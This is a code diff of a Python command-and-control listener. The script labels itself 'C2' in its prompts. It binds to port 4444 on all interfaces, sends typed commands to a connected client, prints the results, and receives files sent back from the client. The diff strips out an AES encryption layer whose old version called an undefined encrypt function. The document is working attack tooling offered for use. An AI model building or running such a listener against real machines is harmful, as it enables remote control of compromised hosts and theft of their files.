@@ -1,47 +1,50 @@
 #!/usr/bin/env python3
-import socket, hashlib, os
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+import socket
+import os
 
-KEY = b'Your32ByteSecretKey1234567890abc!'  # Change this!
-BIND_IP, BIND_PORT = "127.0.0.1", 4444
-
-def decrypt(data):
-    iv = data[:16]
-    cipher = AES.new(KEY, AES.MODE_CBC, iv)
-    return unpad(cipher.decrypt(data[16:]), AES.block_size)
+BIND_IP = "0.0.0.0"  # Listen on all interfaces
+BIND_PORT = 4444     # Change to your preferred port
 
 def start_listener():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((BIND_IP, BIND_PORT))
     server.listen(1)
-    print(f"[+] Encrypted C2 listening on {BIND_IP}:{BIND_PORT}")
+    print(f"[+] C2 Listener started on {BIND_IP}:{BIND_PORT}")
 
     client, addr = server.accept()
-    print(f"[+] Connection from {addr[0]}")
-    
+    print(f"[+] Connection from {addr[0]}:{addr[1]}")
+
     try:
         while True:
             cmd = input("C2> ").strip()
-            if not cmd: continue
-            
-            # File download (server -> client)
-            if cmd.startswith("download "):
-                file_path = cmd.split()[1]
-                if os.path.exists(file_path):
-                    with open(file_path, "rb") as f:
-                        data = f.read()
-                        client.send(encrypt(data))
-                    print(f"[+] Sent {file_path} | SHA-256: {hashlib.sha256(data).hexdigest()}")
-                else:
-                    client.send(encrypt(b"File not found"))
-            
-            # Other commands
+            if not cmd:
+                continue
+
+            client.send(cmd.encode())
+
+            # Exit session
+            if cmd.lower() == "exit":
+                print("[*] Closing connection.")
+                break
+
+            # Download file (server <- client)
+            elif cmd.startswith("download "):
+                file_name = cmd.split(" ", 1)[1]
+                with open(file_name, "wb") as f:
+                    while True:
+                        data = client.recv(4096)
+                        if b"UPLOAD_COMPLETE" in data:
+                            data = data.replace(b"UPLOAD_COMPLETE", b"")
+                            if data:
+                                f.write(data)
+                            print(f"[+] Received {file_name}")
+                            break
+                        f.write(data)
             else:
-                client.send(encrypt(cmd.encode()))
-                if cmd.lower() == "exit": break
-                print(decrypt(client.recv(4096)).decode())
-                
+                # Print command output
+                response = client.recv(4096).decode()
+                print(response)
+
     finally:
         client.close()
         server.close()
